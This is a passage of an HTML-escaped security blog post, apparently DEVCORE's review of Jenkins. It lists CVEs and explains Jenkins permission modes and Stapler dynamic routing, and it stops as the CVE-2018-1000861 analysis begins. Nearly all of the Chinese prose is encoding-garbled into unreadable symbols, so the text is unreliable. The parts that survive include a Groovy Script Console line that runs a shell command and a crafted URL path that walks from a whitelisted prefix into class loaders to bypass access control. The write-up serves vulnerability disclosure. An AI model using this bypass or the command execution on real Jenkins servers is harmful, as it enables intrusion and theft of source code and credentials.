&lt;p&gt;Âú®ËªüÈ´îÂ∑•Á®ã‰∏≠, &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; Âèä &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; ‰∏ÄÁõ¥ÈÉΩË¢´Ë≠ΩÁÇ∫ÊòØËªüÈ´îÈñãÁôº‰∏äÁöÑÂøÖÂÇôÊµÅÁ®ã, ÊúâÂ§öÂ∞ëÂÑ™ÈªûÂ∞±‰∏çÂ§öË´á, ÂÖâÊòØÂπ´Âä©ÈñãÁôºËÄÖÊ∏õÂ∞ëË®±Â§öÈõú‰∫ãÂ∞±ÊòØÂæàÂ§ßÁöÑÂÑ™Âã¢‰∫Ü! ËÄåÂú® CI/CD ÁöÑÈ†òÂüü‰∏≠, Jenkins ÊòØÊúÄÁÇ∫ËÄÅÁâå‰∏îÂª£ÁÇ∫‰∫∫Áü•ÁöÑ‰∏ÄÂ•óÂ∑•ÂÖ∑, Áî±ÊñºÂÆÉÁöÑÊòìÁî®ÊÄß, Âº∑Â§ßÁöÑ Pipeline Á≥ªÁµ±‰ª•ÂèäÂ∞çÊñºÂÆπÂô®ÂÆåÁæéÁöÑÊï¥Âêà‰ΩøÂæó Jenkins ‰πüÊàêÁÇ∫ÁõÆÂâçÊúÄÂ§ö‰∫∫‰ΩøÁî®ÁöÑ CI/CD ÊáâÁî®, Ê†πÊìö Snyk Âú® 2018 Âπ¥ÊâÄÂÅöÂá∫ÁöÑ &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM ÁîüÊÖãÂ†±Âëä&lt;/a&gt; ‰∏≠, Jenkins Âú® CI/CD ÊáâÁî®‰∏≠Á¥Ñ‰ΩîÂÖ≠ÊàêÁöÑÂ∏Ç‰ΩîÁéá!&lt;/p&gt;

&lt;p&gt;Â∞çÊñº &lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;Á¥ÖÈöäÊºîÁ∑¥(Red Team)&lt;/a&gt; ‰æÜË™™, Jenkins Êõ¥ÊòØÂÖµÂÆ∂ÂøÖÁà≠‰πãÂú∞, Âè™Ë¶ÅËÉΩÊéåÊè°‰ºÅÊ•≠Êö¥Èú≤Âú®Â§ñÁöÑ Jenkins Âç≥ÂèØÊéåÊè°Â§ßÈáèÁöÑÂéüÂßãÁ¢º, ÁôªÂÖ•ÊÜëË≠âÁîöËá≥ÊéßÂà∂Â§ßÈáèÁöÑ Jenkins ÁØÄÈªû! Âú®ÈÅéÂéª DEVCORE ÊâÄÁ∂ìÊâãÈÅéÁöÑÊª≤ÈÄèÊ°àÂ≠ê‰∏≠‰πüÂá∫ÁèæÈÅéÊï∏Ê¨°Áî± Jenkins Áï∂ÊàêÈÄ≤ÂÖ•Èªû, ‰∏ÄÊ≠•‰∏ÄÊ≠•Âæû‰∏ÄÂÄãÂ∞èË£ÇÁ∏´Â∞áÁõÆÊ®ôÊíïÈñãÂà∞ÂÆåÊï¥Êª≤ÈÄèÊï¥ÈñìÂÖ¨Âè∏ÁöÑÁ∂ìÂÖ∏Ê°à‰æã!&lt;/p&gt;

&lt;p&gt;ÈÄôÁØáÊñáÁ´†‰∏ªË¶ÅÊòØÂàÜ‰∫´ÂéªÂπ¥‰∏≠ÈáùÂ∞ç Jenkins ÊâÄÂÅöÁöÑ‰∏ÄÊ¨°Á∞°ÂñÆ Security Review, ÈÅéÁ®ã‰∏≠ÂÖ±ÁôºÁèæ‰∫Ü‰∫îÂÄã CVE:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂÖ∂‰∏≠ÊØîËºÉË¢´Â§ßÂÆ∂ÊâÄË®éË´ñÁöÑÊáâË©≤ÊòØ CVE-2018-1999002, ÈÄôÊòØ‰∏ÄÂÄãÂú® Windows ‰∏ãÁöÑ‰ªªÊÑèÊ™îÊ°àËÆÄÂèñ, Áî±ÊñºÊîªÊìäÊñπÂºèÁ®çÂæÆÊúâË∂£ÊâÄ‰ª•Ë®éË´ñËÅ≤ÈáèËºÉÈ´ò‰∏ÄÈªû, ÈÄôÂÄãÂº±ÈªûÂú®Â§ñÈÇä‰πüÊúâ‰∫∫ÂÅö‰∫ÜË©≥Á¥∞ÁöÑÂàÜÊûê, Ë©≥ÊÉÖÂèØ‰ª•ÂèÉËÄÉÁî±È®∞Ë®äÈõ≤ÈºéÂØ¶È©óÂÆ§ÊâÄÂÅöÁöÑÂàÜÊûê(&lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;Jenkins ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÂàÜÊûê&lt;/a&gt;), ‰ªñÂÄë‰πüÊàêÂäüÁöÑÂ±ïÁ§∫Âæû &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; ÊâæÂà∞‰∏ÄÂè∞Êú™‰øÆË£úÁöÑ Jenkins ÂØ¶Áèæ‰ªªÊÑèËÆÄÊ™îÂà∞ÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÂèñÂæóÊ¨äÈôêÁöÑÈÅéÁ®ã!&lt;/p&gt;

&lt;p&gt;‰ΩÜÈÄôÁØáÊñáÁ´†Ë¶ÅÊèêÁöÑ‰∏¶‰∏çÊòØÈÄôÂÄã, ËÄåÊòØÁï∂ÊôÇÁÇ∫‰∫ÜÂòóË©¶ÁπûÈÅé CVE-2018-1999002 ÊâÄÈúÄÁöÑÊúÄÂ∞èÊ¨äÈôê Overall/Read ÊôÇË∑üÈÄ≤ Jenkins ÊâÄ‰ΩøÁî®ÁöÑÊ†∏ÂøÉÊ°ÜÊû∂ Stapler ÊåñÊéòÊâÄÁôºÁèæÁöÑÂè¶Â§ñ‰∏ÄÂÄãÂïèÈ°å - CVE-2018-1000861! Â¶ÇÊûúÂÖâÂæûÂÆòÊñπÁöÑÊºèÊ¥ûÊïòËø∞ÊáâË©≤ÊúÉË¶∫ÂæóÂæàÁ•ûÂ•á, ÁúüÁöÑÂèØ‰ª•ÂÖâÂæûÈö®‰æø‰∏ÄÂÄãÁ∂≤ÂùÄÂéªÈÅîÊàê‰ª£Á¢ºÂü∑Ë°åÂóé?&lt;/p&gt;

&lt;p&gt;ÈáùÂ∞çÈÄôÂÄãÊºèÊ¥û, ÊàëÁöÑËßÄÈªûÊòØÂÆÉÂ∞±ÊòØ‰∏ÄÂÄãÂ≠òÂèñÊéßÂà∂Ê∏ÖÂñÆ(ACL)‰∏äÁöÑÁπûÈÅé, ‰ΩÜÁî±ÊñºÈÄôÊòØ Jenkins Êû∂Êßã‰∏äÁöÑÂïèÈ°å‰∏¶‰∏çÊòØÂñÆ‰∏ÄÁöÑÁ®ãÂºèÁ∑®ÂØ´Â§±Ë™§, ÈÄ≤ËÄåÂ∞éËá¥‰∫ÜÈÄôÂÄãÊºèÊ¥ûÂà©Áî®‰∏äÁöÑÂ§öÊ®£ÊÄß! ËÄåÁÇ∫‰∫ÜÈÄôÂÄãÊäÄË°ìÂÇµ, Jenkins ÂÆòÊñπ‰πüËä±Ë≤ª‰∫Ü‰∏ÄÁï™ÂøÉÂäõ(&lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins Patch&lt;/a&gt; Âèä &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler Patch&lt;/a&gt;)Âéª‰øÆÂæ©ÈÄôÂÄãÊºèÊ¥û, ‰∏ç‰ΩÜÂú®ÂéüÊúâÁöÑÊû∂Êßã‰∏ä‰ªãÁ¥π‰∫ÜÊñ∞ÁöÑË∑ØÁî±ÈªëÂêçÂñÆÂèäÁôΩÂêçÂñÆ, ‰πüÊì¥Â±ï‰∫ÜÂéüÊúâÊû∂ÊßãÁöÑ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; Âéª‰øùË≠∑ Jenkins Ë∑ØÁî±, ‰∏ãÈù¢Â∞±‰æÜËß£ÈáãÁÇ∫‰Ωï Jenkins Ë¶ÅËä±‰∫ÜÈÇ£È∫ºÂ§öÂøÉÂäõÂéª‰øÆÂæ©ÈÄôÂÄãÊºèÊ¥û!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;‰ª£Á¢ºÂØ©Êü•ÁØÑÂúç&quot;&gt;‰ª£Á¢ºÂØ©Êü•ÁØÑÂúç&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;È¶ñÂÖàË¶ÅËÅ≤ÊòéÁöÑÊòØ, ÈÄô‰∏¶‰∏çÊòØ‰∏ÄÊ¨°ÂÆåÊï¥ÁöÑ‰ª£Á¢ºÂØ©Êü•(Áï¢Á´üË¶ÅÂÅö‰∏ÄÊ¨°Â§™Ëä±ÊôÇÈñì‰∫Ü‚Ä¶), Âõ†Ê≠§Âè™ÈáùÂ∞çÈ´òÈ¢®Èö™ÊºèÊ¥ûÈÄ≤Ë°åÊåñÊéò, ËëóÁúºÁöÑÁØÑÂúçÂåÖÊã¨:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins Ê†∏ÂøÉ&lt;/li&gt;
  &lt;li&gt;Stapler Á∂≤È†ÅÊ°ÜÊû∂&lt;/li&gt;
  &lt;li&gt;Âª∫Ë≠∞ÂÆâË£ùÊèí‰ª∂&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jenkins Âú®ÂÆâË£ùÈÅéÁ®ã‰∏≠ÊúÉË©¢ÂïèÊòØÂê¶ÂÆâË£ùÂª∫Ë≠∞ÁöÑÂ•ó‰ª∂(ÂÉèÊòØ Git, GitHub, SVN Ëàá Pipeline‚Ä¶ Á≠âÁ≠â), Âü∫Êú¨‰∏äÂ§ßÂ§öÊï∏‰∫∫ÈÉΩÊúÉÂêåÊÑè‰∏çÁÑ∂Â∞±Âè™ÊúÉÂæóÂà∞‰∏ÄÂÄãÂçäÊÆòÁöÑ Jenkins Âæà‰∏çÊñπ‰æøXD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;jenkins-‰∏≠ÁöÑÊ¨äÈôêÊ©üÂà∂&quot;&gt;Jenkins ‰∏≠ÁöÑÊ¨äÈôêÊ©üÂà∂&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Âõ†ÁÇ∫ÈÄôÊòØ‰∏ÄÂÄãÂü∫Êñº ACL ‰∏äÁöÑÁπûÈÅé, ÊâÄ‰ª•Âú®Ëß£ÈáãÊºèÊ¥û‰πãÂâç, ÂÖà‰æÜ‰ªãÁ¥π‰∏Ä‰∏ã Jenkins ‰∏≠ÁöÑÊ¨äÈôêÊ©üÂà∂! Âú® Jenkins ‰∏≠ÊúâÊï∏Á®Æ‰∏çÂêåÁöÑËßíËâ≤Ê¨äÈôê, ÁîöËá≥ÊúâÂ∞àÈñÄÁöÑ &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt; (ÂêåÁÇ∫Âª∫Ë≠∞ÂÆâË£ùÂ•ó‰ª∂)ÂèØÈáùÂ∞çÂêÑÂ∞àÊ°àÈÄ≤Ë°åÁ¥∞ÈÉ®ÁöÑÊ¨äÈôêË®≠ÂÆö, ÂæûÊîªÊìäËÄÖÁöÑËßíÂ∫¶ÊàëÂÄëÁ≤óÁï•ÂàÜÊàê‰∏âÁ®Æ:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;
&lt;p&gt;Â∞çÊñº Jenkins ÊúâÂÆåÊï¥ÁöÑÊéßÂà∂Ê¨ä, ÂèØÂ∞ç Jenkins ÂÅö‰ªª‰Ωï‰∫ã! Âü∫Êú¨‰∏äÊúâÈÄôÂÄãÊ¨äÈôêÂç≥ÂèØÈÄèÈÅé &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; ‰ªãÈù¢‰ΩøÁî® Groovy Âü∑Ë°å‰ªªÊÑè‰ª£Á¢º!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄãÊ¨äÈôêÂ∞çÊñºÈß≠ÂÆ¢‰æÜË™™‰πüÊòØÊúÄÊ∏¥ÊúõÂæóÂà∞ÁöÑÊ¨äÈôê, ‰ΩÜÂü∫Êú¨‰∏äÁî±ÊñºÂÆâÂÖ®ÊÑèË≠òÁöÑÊèêÂçáÂèäÁ∂≤Ë∑Ø‰∏äÂêÑÁ®ÆÊÆ≠Â±çÁ∂≤Ë∑ØÂ∞çÂÖ®Á∂≤ÈÄ≤Ë°åÊéÉÊèè, ÈÄôÁ®ÆÈÖçÁΩÆÂ∑≤Á∂ìÂæàÂ∞ëË¶ã(ÊàñÂè™Ë¶ãÊñºÂÖßÁ∂≤)&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;ÂèØÂæû &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; ‰ªãÈù¢‰∏≠ÂãæÈÅ∏‰∏ãÈù¢ÈÅ∏È†Ö‰æÜÈñãÂïüÈÄôÂÄãÊ®°Âºè&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Âú®ÈÄôÂÄãÊ®°Âºè‰∏ã, ÊâÄÊúâÁöÑÂÖßÂÆπÁöÜÊòØÂèØËÆÄÁöÑ, ‰æãÂ¶ÇÂèØÁúãÂà∞Â∑•‰ΩúÊó•Ë™åÊàñÊòØ‰∏Ä‰∫õ job/node Á≠âÊïèÊÑüË≥áË®ä, Â∞çÊñºÊîªÊìäËÄÖ‰æÜË™™Âú®ÈÄôÂÄãÊ®°Âºè‰∏ãÊúÄÂ§ßÁöÑÂ•ΩËôïÂ∞±ÊòØÂèØ‰ª•Áç≤ÂæóÂ§ßÈáèÁöÑÂéüÂßãÁ¢º! ‰ΩÜËàá Full Access Ê®°ÂºèÊúÄÂ§ßÁöÑÂ∑ÆÁï∞ÂâáÊòØÁÑ°Ê≥ïÈÄ≤Ë°åÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÊìç‰ΩúÊàñÊòØÂü∑Ë°å Groovy ‰ª£Á¢º‰ª•ÂèñÂæóÊéßÂà∂Ê¨ä!&lt;/p&gt;

&lt;p&gt;ÈõñÁÑ∂ÈÄô‰∏çÊòØ Jenkins ÁöÑÈ†êË®≠Ë®≠ÂÆö, ‰ΩÜÂ∞çÊñº‰∏Ä‰∫õÁøíÊÖ£Ëá™ÂãïÂåñÁöÑ DevOps ‰æÜË™™ÈÇÑÊòØÊúâÂèØËÉΩÈñãÂïüÈÄôÂÄãÈÅ∏È†Ö, Ê†πÊìöÂØ¶ÈöõÂú® &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; ‰∏äÁöÑË™øÊü•Á¥Ñ 12% ÁöÑÊ©üÂô®ÈÇÑÊòØÈñãÂïüÈÄôÂÄãÈÅ∏È†Ö! ‰ª•‰∏ã‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; ‰æÜ‰ª£Á®±ÈÄôÂÄãÊ®°Âºè&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;ÈÄôÊòØ Jenkins È†êË®≠ÂÆâË£ùÂ•ΩÁöÑË®≠ÂÆö, Âú®Ê≤íÊúâ‰∏ÄÁµÑÊúâÊïàÁöÑÂ∏≥ËôüÂØÜÁ¢ºÁãÄÊ≥Å‰∏ãÁÑ°Ê≥ïÁúãÂà∞‰ªª‰ΩïË≥áË®äÂèäÈÄ≤Ë°å‰ªª‰ΩïÊìç‰Ωú! ‰ª•‰∏ã‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; ‰æÜ‰ª£Á®±Ê≠§Ê®°Âºè&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÂàÜÊûê&quot;&gt;ÊºèÊ¥ûÂàÜÊûê&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Êï¥ÂÄãÊºèÊ¥ûË¶ÅÂæû Jenkins ÁöÑ &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;ÂãïÊÖãË∑ØÁî±&lt;/a&gt; Ë¨õËµ∑, ÁÇ∫‰∫ÜÁµ¶ÈñãÁôºËÄÖÊõ¥Â§ßÁöÑÂΩàÊÄß, Jenkins(Âö¥Ê†º‰æÜË¨õÊòØ Stapler)‰ΩøÁî®‰∫Ü‰∏ÄÂ•ó Naming Convention ÂéªÂåπÈÖçË∑ØÁî±ÂèäÂãïÊÖãÁöÑÂü∑Ë°å! È¶ñÂÖà Jenkins ‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; ÁÇ∫ÂàÜÈöîÂ∞á URL Á¨¶ËôüÂåñ, Êé•ËëóÁî± &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; ÁÇ∫ÂÖ•Âè£ÈªûÈñãÂßãÂæÄ‰∏ãÊêúÂ∞ã, Â¶ÇÊûúÁ¨¶ËôüÁ¨¶Âêà (1) Public Â±¨ÊÄßÁöÑÊàêÂì°ÊàñÊòØ (2) Public Â±¨ÊÄßÁöÑÊñπÊ≥ïÁ¨¶Âêà‰∏ãÂàóÂëΩÂêçË¶èÂâá, ÂâáË™øÁî®‰∏¶ÁπºÁ∫åÂæÄ‰∏ãÂëºÂè´:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, ‚Ä¶)&lt;/li&gt;
    &lt;li&gt;doDynamic(‚Ä¶)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(‚Ä¶)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(‚Ä¶)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;ÁúãËµ∑‰æÜ Jenkins Áµ¶‰∫àÈñãÁôºËÄÖÂæàÂ§ßÁ®ãÂ∫¶ÁöÑËá™Áî±ÂéªË®™ÂïèÂêÑÂÄãÁâ©‰ª∂, ‰ΩÜÈÅéÊñºËá™Áî±Á∏ΩÊòØ‰∏çÂ•ΩÁöÑÔºåÊ†πÊìöÈÄôÁ®ÆË™øÁî®ÊñπÂºèÈÄôË£°Â∞±Âá∫Áèæ‰∫ÜÂÖ©ÂÄãÂïèÈ°å!&lt;/p&gt;

&lt;h3 id=&quot;1-Ëê¨Áâ©ÁöÜÁπºÊâø-javalangobject&quot;&gt;1. Ëê¨Áâ©ÁöÜÁπºÊâø java.lang.Object&lt;/h3&gt;
&lt;p&gt;Âú® Java ‰∏≠, ÊâÄÊúâÁöÑÁâ©‰ª∂ÁöÜÁπºÊâø &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt; ÈÄôÂÄãÈ°ûÂà•, Âõ†Ê≠§ÊâÄÊúâÂú® Java ‰∏≠ÁöÑÁâ©‰ª∂ÁöÜÂ≠òÂú®Ëëó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; ÈÄôÂÄãÊñπÊ≥ï! ËÄåÊÅ∞Â∑ßÈÄôÂÄãÊñπÊ≥ïÂèàÁ¨¶ÂêàÂëΩÂêçË¶èÂâá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#1&lt;/code&gt;, Âõ†Ê≠§ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; ÂèØÂú® Jenkins Ë™øÁî®Èèà‰∏≠Ë¢´ÂãïÊÖãÂëºÂè´!&lt;/p&gt;

&lt;h3 id=&quot;2-Ë∑®Áâ©‰ª∂Êìç‰ΩúÂ∞éËá¥ÁôΩÂêçÂñÆÁπûÈÅé&quot;&gt;2. Ë∑®Áâ©‰ª∂Êìç‰ΩúÂ∞éËá¥ÁôΩÂêçÂñÆÁπûÈÅé&lt;/h3&gt;

&lt;p&gt;ÂâçÈù¢ÊâÄÊèêÂà∞ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ&lt;/code&gt;, ÂÖ∂‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;True&lt;/code&gt; Ëàá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; ÈñìÊúÄÂ§ßÁöÑ‰∏çÂêåÂú®ÊñºÁï∂Âú®Á¶ÅÊ≠¢ÁöÑÁãÄÊ≥Å‰∏ã, ÊúÄÂàùÁöÑÂÖ•Âè£ÈªûÊúÉÈÄèÈÅé &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt; Â§öÂÅö‰∏ÄÂÄãÂü∫ÊñºÁôΩÂêçÂñÆÁöÑ URL ÂâçÁ∂¥Ê™¢Êü•, ÈÄôÂÄãÁôΩÂêçÂñÆÂ¶Ç‰∏ã:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄô‰πü‰ª£Ë°®Ëëó‰∏ÄÈñãÂßãÂèØÈÅ∏ÁöÑÂÖ•Âè£ÈôêÂà∂Êõ¥Âö¥Ê†ºÈÅ∏ÊìáÊõ¥Â∞ë, ‰ΩÜÂ¶ÇÊûúËÉΩÂú®‰∏ÄÂÄãÁôΩÂêçÂñÆ‰∏äÁöÑÂÖ•Âè£ÊâæÂà∞ÂÖ∂‰ªñÁâ©‰ª∂ÂèÉËÄÉ, Ë∑≥Âà∞ÈùûÁôΩÂêçÂñÆ‰∏äÁöÑÊàêÂì°Ë±à‰∏çÂèØ‰ª•ÁπûÈÅéÂâçËø∞ÁöÑ URL ÂâçÁ∂¥ÈôêÂà∂? ÂèØËÉΩÊúâÈªûÈõ£ÁêÜËß£, ÈÄôË£°ÂÖà‰æÜ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑÁØÑ‰æã‰æÜËß£Èáã Jenkins ÁöÑÂãïÊÖãË∑ØÁî±Ê©üÂà∂:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰ª•‰∏äÁ∂≤ÂùÄÊúÉ‰æùÂ∫èÂü∑Ë°å‰∏ãÂàóÊñπÊ≥ï&lt;/p&gt;

